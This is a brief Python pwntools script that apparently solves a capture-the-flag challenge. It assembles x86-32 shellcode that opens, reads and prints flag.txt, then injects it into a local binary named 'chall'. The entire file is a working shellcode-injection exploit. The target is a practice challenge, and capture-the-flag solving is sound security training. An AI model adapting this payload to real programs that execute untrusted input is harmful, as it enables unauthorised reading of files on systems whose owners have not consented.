#!/usr/bin/python2
#https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md #x86-32_bit
from pwn import *

p = process('./chall')
payload = shellcraft.open('flag.txt', 0, 0)
payload += shellcraft.read('eax', 'esp', 100)
payload += shellcraft.write(1, 'esp', 'eax')


payload = asm(payload)
p.sendline(payload)
p.interactive()
